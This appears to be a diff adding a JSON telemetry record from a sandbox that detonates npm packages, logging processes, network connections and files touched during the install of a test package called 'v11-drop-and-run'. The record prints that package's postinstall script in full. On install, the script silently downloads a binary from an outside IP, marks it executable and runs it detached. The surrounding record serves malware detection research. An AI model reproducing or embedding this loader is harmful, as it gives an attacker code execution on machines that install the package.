@@ -1,0 +1,102 @@
+{
+ "job_id": "b119f6d6-2e89-490a-b96e-ac162058bc83",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 137.59,
+ "exec_events": [
+  {
+   "ts": "2026-11-04T00:41:06.455676374Z",
+   "pid": 290491,
+   "ppid": 290467,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-e8c8107c24bda570; \"$@\"; rc=$?; /bin/true post-e8c8107c24bda570; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/v11-drop-and-run",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:41:06.460605851Z",
+   "pid": 290541,
+   "ppid": 290491,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v11-drop-and-run",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:41:06.461323696Z",
+   "pid": 290541,
+   "ppid": 290541,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v11-drop-and-run",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:41:06.989922763Z",
+   "pid": 290600,
+   "ppid": 290541,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/v11-drop-and-run"
+  },
+  {
+   "ts": "2026-11-04T00:41:06.990947458Z",
+   "pid": 290601,
+   "ppid": 290600,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/v11-drop-and-run"
+  }
+ ],
+ "connect_events": [
+  {
+   "ts": "2026-11-04T00:41:07.030856730Z",
+   "pid": 290601,
+   "binary": "/usr/local/bin/node",
+   "daddr": "203.0.113.50",
+   "dport": 80,
+   "family": "AF_INET",
+   "resolved_domain": null,
+   "protocol": "tcp"
+  }
+ ],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-04T00:41:06.642342684Z",
+   "pid": 290541,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/v11-drop-and-run/scripts/setup.js",
+   "package": null,
+   "sha256": "880d40b16d96cb5361111b4f9b60feaf7089d1108ab2d83e314e08591775366a",
+   "content": "const http = require(\"http\"), fs = require(\"fs\"), os = require(\"os\"), path = require(\"path\");\nconst { spawn } = require(\"child_process\");\nconst dest = path.join(os.tmpdir(), \"stage.bin\");\nhttp.get({ host: \"203.0.113.50\", path: \"/stage.bin\", timeout: 3000 }, (res) => {\n  const out = fs.createWriteStream(dest);\n  res.pipe(out);\n  out.on(\"finish\", () => {\n    try { fs.chmodSync(dest, 0o755); spawn(dest, { detached: true, stdio: \"ignore\" }).unref(); }\n    catch {}\n  });\n}).on(\"error\", () => {});\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> v11@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 2m\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.76,
+  "peak_memory_mb": 42.7,
+  "samples": 270
+ }
+}
